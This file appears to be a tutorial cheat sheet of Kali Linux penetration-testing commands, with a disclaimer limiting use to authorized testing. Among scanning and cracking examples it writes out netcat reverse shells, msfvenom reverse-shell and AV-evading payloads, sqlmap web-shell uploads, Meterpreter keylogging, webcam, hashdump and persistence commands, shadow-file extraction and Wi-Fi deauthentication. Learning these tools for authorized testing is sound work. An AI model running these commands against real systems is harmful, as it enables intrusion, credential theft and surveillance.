USAGE.md: Comprehensive Kali Linux Tool Guide

📋 Legal Disclaimer

IMPORTANT: All tools and techniques described in this document are for authorized security testing only. You must have explicit written permission before testing any system or network you do not own. Unauthorized access is illegal and unethical .

📦 Package Management & Installation

Updating Your Kali System

Before using any tools, ensure your system is up to date:

```bash
# Update package lists
sudo apt update

# Upgrade all installed packages
sudo apt upgrade -y

# Full distribution upgrade (recommended)
sudo apt full-upgrade -y

# Remove unnecessary packages
sudo apt autoremove -y
```

Installing Tools via Metapackages

Kali uses metapackages to install groups of related tools :

```bash
# View installed Kali metapackages
apt list --installed | grep kali

# Install complete Kali toolset (large!)
sudo apt install kali-linux-large -y

# Install specific tool categories
sudo apt install kali-tools-information-gathering -y
sudo apt install kali-tools-vulnerability -y
sudo apt install kali-tools-web -y
sudo apt install kali-tools-passwords -y
sudo apt install kali-tools-exploitation -y
sudo apt install kali-tools-wireless -y
sudo apt install kali-tools-forensics -y
sudo apt install kali-tools-post-exploitation -y
```

Installing Individual Tools

```bash
# Syntax
sudo apt install <tool-name> -y

# Examples
sudo apt install nmap -y
sudo apt install metasploit-framework -y
sudo apt install hydra -y
```

🔍 Information Gathering Tools

Nmap - Network Mapper

Nmap is the industry standard for network discovery and port scanning .

Installation (pre-installed in Kali):

```bash
sudo apt install nmap -y
```

Basic Usage:

```bash
# Basic scan of a single host
nmap 192.168.1.1

# Scan with service version detection
nmap -sV 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.1

# Scan specific ports
nmap -p 22,80,443 192.168.1.1
nmap -p 1-1000 192.168.1.1

# Scan entire subnet
nmap 192.168.1.0/24

# Fast scan (fewer ports, faster execution)
nmap -F 192.168.1.1

# Stealth SYN scan (half-open)
nmap -sS 192.168.1.1

# UDP scan
nmap -sU 192.168.1.1

# Save results
nmap -oN scan_results.txt 192.168.1.1
nmap -oX scan_results.xml 192.168.1.1
```

Advanced NSE Scripts:

```bash
# Update NSE scripts
nmap --script-updatedb

# Run vulnerability scripts
nmap --script vuln 192.168.1.1

# Run specific script
nmap --script http-enum 192.168.1.1

# Run multiple scripts
nmap --script http-*,ssl-* 192.168.1.1

# Brute force with scripts
nmap --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt 192.168.1.1
```

Netcat - Swiss Army Knife of Networking

Installation:

```bash
sudo apt install netcat-openbsd -y
```

Usage:

```bash
# Port scanning
nc -zv 192.168.1.1 1-1000

# Banner grabbing
nc -vn 192.168.1.1 80
HEAD / HTTP/1.0

# Create a listener (backdoor)
nc -lvnp 4444

# Connect to listener
nc 192.168.1.100 4444

# File transfer (sender)
nc -lvnp 4444 < file.txt

# File transfer (receiver)
nc 192.168.1.100 4444 > received.txt

# Bind shell (target)
nc -lvnp 4444 -e /bin/bash

# Reverse shell (attacker listener first, then target)
nc -e /bin/bash 192.168.1.100 4444
```

DNS Enumeration Tools

dnsenum:

```bash
sudo apt install dnsenum -y

# Basic enumeration
dnsenum example.com

# With wordlist
dnsenum -f /usr/share/wordlists/dnsmap.txt example.com

# Enable whois lookups
dnsenum --whois example.com

# Save output
dnsenum -o output.xml example.com
```

dnsrecon:

```bash
sudo apt install dnsrecon -y

# Standard enumeration
dnsrecon -d example.com

# Brute force subdomains
dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t brt

# Reverse lookup
dnsrecon -r 192.168.1.0/24 -n 8.8.8.8

# Zone transfer attempt
dnsrecon -d example.com -t axfr

# Save to database
dnsrecon -d example.com --xml output.xml
```

Sublist3r (subdomain enumeration):

```bash
sudo apt install sublist3r -y

# Basic subdomain scan
sublist3r -d example.com

# Enable brute force
sublist3r -d example.com -b

# Save output
sublist3r -d example.com -o subdomains.txt

# Use specific ports
sublist3r -d example.com -p 80,443
```

🕸️ Web Application Testing Tools

SQLmap - Automated SQL Injection

SQLmap detects and exploits SQL injection flaws .

Installation:

```bash
sudo apt install sqlmap -y
```

Basic Usage:

```bash
# Basic detection
sqlmap -u "http://example.com/page.php?id=1"

# Get database names
sqlmap -u "http://example.com/page.php?id=1" --dbs

# Get tables from a database
sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables

# Dump table contents
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T users --dump

# POST request with data
sqlmap -u "http://example.com/login.php" --data="user=admin&pass=test"

# With cookie authentication
sqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Use Tor for anonymity
sqlmap -u "http://example.com/page.php?id=1" --tor --tor-type=SOCKS5
```

Advanced Options:

```bash
# Level 5 with all techniques
sqlmap -u "http://example.com/page.php?id=1" --level=5 --risk=3

# Specify injection technique (BEUSTQ)
sqlmap -u "http://example.com/page.php?id=1" --technique=BEUS

# OS shell access
sqlmap -u "http://example.com/page.php?id=1" --os-shell

# Read file from server
sqlmap -u "http://example.com/page.php?id=1" --file-read=/etc/passwd

# Write file to server
sqlmap -u "http://example.com/page.php?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php
```

Nikto - Web Server Scanner

Installation:

```bash
sudo apt install nikto -y
```

Usage:

```bash
# Basic scan
nikto -h http://example.com

# Scan with SSL
nikto -h https://example.com

# Scan on specific port
nikto -h example.com -p 8080

# Save report
nikto -h example.com -Format html -o nikto_report.html

# Use proxy
nikto -h example.com -useproxy http://127.0.0.1:8080

# Authentication
nikto -h http://example.com -id admin:password

# Tuning (select specific tests)
nikto -h example.com -Tuning 123
# 1=Interesting File, 2=Misconfiguration, 3=Information Disclosure
```

Dirb/Gobuster - Directory Brute Force

Dirb:

```bash
sudo apt install dirb -y

# Basic directory scan
dirb http://example.com

# Use custom wordlist
dirb http://example.com /usr/share/wordlists/dirb/common.txt

# With extensions
dirb http://example.com -X .php,.asp,.jsp

# Save output
dirb http://example.com -o dirb_results.txt
```

Gobuster (faster alternative):

```bash
sudo apt install gobuster -y

# Directory brute force
gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# With file extensions
gobuster dir -u http://example.com -w wordlist.txt -x php,html,txt

# DNS subdomain enumeration
gobuster dns -d example.com -w /usr/share/wordlists/dnsmap.txt

# Virtual host brute force
gobuster vhost -u http://example.com -w subdomains.txt
```

FFUF - Fast Web Fuzzer

Installation:

```bash
sudo apt install ffuf -y
```

Usage:

```bash
# Directory fuzzing
ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# File extension fuzzing
ffuf -u http://example.com/indexFUZZ -w extensions.txt

# POST parameter fuzzing
ffuf -u http://example.com/login.php -X POST -d "user=FUZZ&pass=test" -w users.txt -fc 401

# Recursion
ffuf -u http://example.com/FUZZ -w wordlist.txt -recursion

# Filter by response size
ffuf -u http://example.com/FUZZ -w wordlist.txt -fs 4242

# Proxy through Burp
ffuf -u http://example.com/FUZZ -w wordlist.txt -x http://127.0.0.1:8080
```

WhatWeb - Website Fingerprinting

Installation:

```bash
sudo apt install whatweb -y
```

Usage:

```bash
# Basic scan
whatweb example.com

# Aggressive scan
whatweb -a 3 example.com

# Multiple targets
whatweb example.com google.com

# Save output
whatweb --log-verbose=report.txt example.com

# Proxy
whatweb --proxy http://127.0.0.1:8080 example.com
```

🔑 Password Cracking Tools

John the Ripper

John is a fast password cracker supporting hundreds of hash formats .

Installation:

```bash
sudo apt install john -y
```

Basic Usage:

```bash
# Crack a password file (auto-detects hash)
john hashes.txt

# Show cracked passwords
john --show hashes.txt

# Use wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Use wordlist with rules (mangling)
john --wordlist=wordlist.txt --rules hashes.txt

# Specify hash format
john --format=raw-md5 hashes.txt
john --format=sha512crypt hashes.txt
john --format=wpapsk hashes.txt
```

Unshadow - Combine passwd and shadow:

```bash
# Extract Linux password hashes
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

Zip File Cracking:

```bash
# Extract hash from zip
zip2john protected.zip > zip.hash

# Crack it
john zip.hash
```

PDF File Cracking:

```bash
# Extract hash from PDF
pdf2john protected.pdf > pdf.hash
john pdf.hash
```

RAR File Cracking:

```bash
# Extract hash from RAR
rar2john protected.rar > rar.hash
john rar.hash
```

Hydra - Network Login Cracker

Hydra performs brute-force attacks against network services .

Installation:

```bash
sudo apt install hydra -y
```

Wordlist Preparation:

```bash
# Extract rockyou wordlist (if compressed)
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Or install wordlists
sudo apt install wordlists -y
```

SSH Brute Force:

```bash
# Single user
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# User list
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# Specific port
hydra -l admin -P pass.txt ssh://192.168.1.100 -s 2222
```

FTP Brute Force:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100
```

HTTP POST Form:

```bash
hydra -l admin -P pass.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

RDP (Windows Remote Desktop):

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.100
```

MySQL:

```bash
hydra -l root -P pass.txt mysql://192.168.1.100
```

SMTP:

```bash
hydra -l user@example.com -P pass.txt smtp://192.168.1.100 -s 25
```

Password Spraying (one password, many users):

```bash
hydra -L users.txt -p Password123 ssh://192.168.1.100
```

Hashcat - GPU-Powered Cracking

Installation:

```bash
sudo apt install hashcat -y
```

Basic Usage:

```bash
# Wordlist attack
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
# -m 0 = MD5, -a 0 = dictionary attack

# Show cracked hashes
hashcat -m 0 hashes.txt --show

# Brute force (mask attack)
hashcat -m 0 -a 3 hashes.txt ?d?d?d?d?d?d
# ?d = digit, ?l = lowercase, ?u = uppercase, ?s = special

# Rule-based attack
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

Common Hash Types:

```bash
# MD5
hashcat -m 0 hashes.txt wordlist.txt

# SHA1
hashcat -m 100 hashes.txt wordlist.txt

# SHA256
hashcat -m 1400 hashes.txt wordlist.txt

# NTLM (Windows)
hashcat -m 1000 hashes.txt wordlist.txt

# bcrypt
hashcat -m 3200 hashes.txt wordlist.txt

# WPA/WPA2
hashcat -m 2500 capture.hccapx wordlist.txt
```

Crunch - Wordlist Generator

Installation:

```bash
sudo apt install crunch -y
```

Usage:

```bash
# Generate all 4-digit PINs
crunch 4 4 0123456789 -o pins.txt

# Generate with pattern
crunch 6 6 -t pass%% -o wordlist.txt
# % = numbers, @ = lowercase, , = uppercase

# Generate from character set
crunch 8 8 abcdefghijklmnopqrstuvwxyz -o wordlist.txt

# Generate with specified number of lines
crunch 8 8 -p password123 -o limited.txt
```

💥 Exploitation Tools

Metasploit Framework

Metasploit is the most widely used exploitation framework .

Installation:

```bash
sudo apt install metasploit-framework -y

# Initialize database (recommended)
sudo systemctl enable postgresql
sudo systemctl start postgresql
sudo msfdb init
```

Starting Metasploit:

```bash
# Start console
msfconsole

# Start console with database
msfdb run
```

Basic msfconsole Commands:

```bash
# Help
help

# Search for exploits
search eternalblue
search type:exploit platform:windows
search cve:2021

# Use a module
use exploit/windows/smb/ms17_010_eternalblue

# Show module info
info

# Show options
show options
show payloads
show targets

# Set options
set RHOSTS 192.168.1.100
set RPORT 445
set LHOST 192.168.1.50
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run exploit
run
# or
exploit

# Background session
# Use CTRL+Z then 'y'

# List sessions
sessions -l

# Interact with session
sessions -i 1
```

Meterpreter Commands (post-exploitation):

```bash
# System information
sysinfo
getuid

# Process management
ps
migrate <PID>

# File operations
ls
cd /tmp
download <file>
upload <file>

# Screenshot
screenshot

# Keylogging
keyscan_start
keyscan_dump

# Webcam
webcam_list
webcam_snap

# Hash dumping (Windows)
hashdump

# Shell access
shell

# Persistence
run persistence -U -X -i 30 -p 4444 -r 192.168.1.50
```

msfvenom - Payload Generator:

```bash
# List payloads
msfvenom -l payloads

# Windows reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe

# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf > shell.elf

# Android payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o robie.apk

# PHP webshell
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw > shell.php

# Python payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o shell.py

# Encoded payload (AV evasion)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > encoded.exe
```

Searchsploit - Exploit Database

Installation:

```bash
sudo apt install exploitdb -y
```

Usage:

```bash
# Search for exploits
searchsploit eternalblue
searchsploit apache 2.4.49
searchsploit windows smb

# Update database
searchsploit -u

# Show full path
searchsploit -p 12345

# Copy exploit to current directory
searchsploit -m 12345
```

📡 Sniffing & Spoofing

Wireshark - Packet Analyzer

Installation:

```bash
sudo apt install wireshark -y
```

CLI Version (tshark):

```bash
# Capture on interface
sudo tshark -i eth0

# Capture 100 packets and save
sudo tshark -i eth0 -c 100 -w capture.pcapng

# Read capture file
tshark -r capture.pcapng

# Filter HTTP traffic
tshark -Y "http" -r capture.pcapng

# Display specific fields
tshark -T fields -e ip.src -e ip.dst -e http.request.uri
```

Wireshark GUI Filters:

```
# Display filters (in GUI)
ip.addr == 192.168.1.100
tcp.port == 80
http.request.method == "POST"
tcp contains "password"
```

tcpdump - Command-Line Packet Capture

Installation:

```bash
sudo apt install tcpdump -y
```

Usage:

```bash
# Capture on interface
sudo tcpdump -i eth0

# Capture 100 packets
sudo tcpdump -c 100 -i eth0

# Save to file
sudo tcpdump -i eth0 -w capture.pcap

# Read capture file
tcpdump -r capture.pcap

# Filter by host
sudo tcpdump host 192.168.1.100

# Filter by port
sudo tcpdump port 80

# Filter by protocol
sudo tcpdump icmp

# Verbose output
sudo tcpdump -v -i eth0

# Don't resolve hostnames
sudo tcpdump -n -i eth0
```

🎯 Vulnerability Analysis

Nikto - Web Vulnerability Scanner

Already covered in Web Tools section.

Lynis - System Auditing

Installation:

```bash
sudo apt install lynis -y
```

Usage:

```bash
# Run system audit
sudo lynis audit system

# Run with specific profile
sudo lynis audit system --profile /etc/lynis/default.prf

# Quick scan (less tests)
sudo lynis audit system --quick

# Check for pentest
sudo lynis audit system --pentest
```

Nmap Vulnerability Scripts

```bash
# Update script database
sudo nmap --script-updatedb

# Run all vulnerability scripts
nmap --script vuln 192.168.1.100

# Run specific vulnerability check
nmap --script http-vuln-* 192.168.1.100
nmap --script ssl-* 192.168.1.100
```

📱 Wireless Testing Tools

Aircrack-ng Suite

Installation:

```bash
sudo apt install aircrack-ng -y
```

Monitor Mode Setup:

```bash
# Check wireless interfaces
airmon-ng

# Kill interfering processes
airmon-ng check kill

# Start monitor mode
airmon-ng start wlan0
# Creates wlan0mon interface
```

Packet Capture:

```bash
# Scan for networks
airodump-ng wlan0mon

# Capture on specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# -c = channel, --bssid = target MAC, -w = output file
```

Deauthentication Attack:

```bash
# Deauth clients to capture handshake
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# 10 = number of deauth packets, -a = target AP
```

Crack WPA/WPA2:

```bash
# Capture handshake first (capture-01.cap)
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

🐍 Python Tools & Libraries

Install Python Tools via pip

```bash
# Install pip if needed
sudo apt install python3-pip -y

# Common pentesting Python tools
pip3 install --user dirsearch
pip3 install --user theHarvester
pip3 install --user wfuzz
pip3 install --user crackmapexec
pip3 install --user impacket
pip3 install --user pwntools
pip3 install --user requests beautifulsoup4
pip3 install --user scapy
pip3 install --user paramiko
```

Impacket Examples

```bash
# SMB enumeration
smbclient.py domain/user:pass@192.168.1.100

# Get user list from domain
GetADUsers.py -all domain/user:pass@192.168.1.100

# WMI execution
wmiexec.py user:pass@192.168.1.100

# SMB server for file transfer
smbserver.py share /path/to/files
```

🛠️ Additional Useful Tools

net-tools (ifconfig, netstat)

```bash
sudo apt install net-tools -y

# Show interfaces
ifconfig

# Show network statistics
netstat -tulpn
```

iproute2 (modern networking)

```bash
# Show interfaces (modern)
ip addr show

# Show routing table
ip route show
```

curl & wget

```bash
# Download file
wget http://example.com/file.zip

# HTTP request with headers
curl -I http://example.com

# POST data
curl -X POST -d "user=admin&pass=test" http://example.com/login

# Use proxy
curl -x http://proxy:8080 http://example.com
```

openssl - Certificate & Encryption

```bash
# Connect to SSL service
openssl s_client -connect example.com:443

# Generate CSR
openssl req -new -newkey rsa:2048 -nodes -keyout key.pem -out request.csr

# Test certificate
openssl verify -CAfile ca.pem cert.pem
```

screen - Terminal Multiplexer

```bash
# Start new session
screen -S session_name

# Detach (Ctrl+A, D)

# List sessions
screen -ls

# Reattach
screen -r session_name
```

📊 Tool Categories Quick Reference

Category Tools
Information Gathering Nmap, Netcat, dnsenum, dnsrecon, sublist3r, whatweb
Web Application SQLmap, Nikto, Dirb, Gobuster, FFUF, Burp Suite
Password Attacks John, Hydra, Hashcat, Crunch, wordlists
Exploitation Metasploit, searchsploit, msfvenom
Sniffing/Spoofing Wireshark, tcpdump, bettercap
Wireless Aircrack-ng, reaver, bully
Post-Exploitation Impacket, mimikatz, powersploit

🚀 Automation Scripts

Update All Tool Databases

Save as update-tools.sh:

```bash
#!/bin/bash
echo "[*] Updating system..."
sudo apt update && sudo apt upgrade -y

echo "[*] Updating exploit databases..."
sudo searchsploit -u
sudo nmap --script-updatedb

echo "[*] Updating metasploit..."
sudo msfupdate

echo "[+] Update complete!"
```

Quick Pentest Setup

```bash
#!/bin/bash
# Create workspace
mkdir -p ~/workspace/{targets,scans,exploits,loot}

# Install common tools if missing
sudo apt install -y \
    nmap masscan netcat-openbsd \
    hydra john hashcat \
    sqlmap nikto gobuster ffuf \
    metasploit-framework exploitdb \
    wireshark tcpdump \
    python3-pip

echo "[+] Workspace ready at ~/workspace/"
```

📝 Logging & Reporting

Save Command Outputs

```bash
# Redirect output to file
nmap -A 192.168.1.100 > scan_results.txt

# Append to file
echo "--- Scan started at $(date) ---" >> scan_log.txt
nmap -A 192.168.1.100 >> scan_log.txt

# Save with tee (display and save)
nmap -A 192.168.1.100 | tee scan_results.txt
```

Generate HTML Reports

```bash
# Nmap to HTML
nmap -A 192.168.1.100 -oX scan.xml
xsltproc scan.xml -o report.html

# Nikto HTML report
nikto -h http://example.com -Format html -o nikto_report.html

# Metasploit logging
spool msf_output.txt
# ... run commands
spool off
```

🔒 Privacy & Anonymity

Tor + Proxychains

```bash
# Install Tor
sudo apt install tor torsocks proxychains4 -y

# Start Tor service
sudo systemctl start tor
sudo systemctl enable tor

# Configure proxychains
sudo nano /etc/proxychains.conf
# Last line should be: socks5 127.0.0.1 9050

# Use with tools
proxychains4 nmap -sT 192.168.1.100
proxychains4 sqlmap -u "http://example.com/page.php?id=1"

# Use torsocks directly
torsocks curl https://check.torproject.org/api/ip
```

MAC Address Changer

```bash
# Install macchanger
sudo apt install macchanger -y

# Random MAC
sudo macchanger -r wlan0

# Set specific MAC
sudo macchanger -m 00:11:22:33:44:55 wlan0

# Show current MAC
sudo macchanger -s wlan0
```

⚠️ Common Issues & Solutions

"Command not found"

```bash
# Tool not installed
sudo apt install <tool-name> -y

# Or check path
which <tool>
```

Permission Denied

```bash
# Need sudo for most network operations
sudo <command>

# Make script executable
chmod +x script.sh
```

"Can't find wordlist"

```bash
# Install wordlists
sudo apt install wordlists seclists -y

# Extract rockyou
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Location
ls /usr/share/wordlists/
ls /usr/share/seclists/
```

Metasploit Database Errors

```bash
# Reinitialize database
sudo msfdb reinit
sudo systemctl restart postgresql
```

📚 Learning Resources

· Official Kali Docs: https://www.kali.org/docs/
· Exploit Database: https://www.exploit-db.com/
· OWASP Top 10: https://owasp.org/www-project-top-ten/
· HackTheBox: https://www.hackthebox.com/
· TryHackMe: https://tryhackme.com/
· VulnHub: https://www.vulnhub.com/

---

Created by RobbieJr
For educational and authorized testing purposes only
